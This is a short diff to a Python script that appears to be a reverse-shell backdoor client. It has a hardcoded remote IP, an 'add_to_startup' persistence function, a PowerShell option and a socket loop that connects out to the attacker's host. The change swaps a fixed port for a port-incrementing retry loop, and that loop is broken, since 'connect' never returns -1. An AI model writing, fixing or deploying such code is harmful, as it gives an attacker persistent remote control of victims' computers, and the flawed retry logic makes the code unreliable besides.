@@ -6,7 +6,6 @@ from getpass import getuser
 from shutil import copyfile
 
 IP = "100.64.3.96"
-PORT = 9999
 USERNAME = getuser()
 
 def add_to_startup():
@@ -29,9 +28,10 @@ def main():
         powershell = False
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        port = 9999
         while True:
-            s.connect((IP, PORT))
-            s.settimeout(30)
+            while s.connect((IP, port)) == -1:
+                port += 1 
 #            s.send("[*] Connection Established\n".encode())
             done = False
             try:
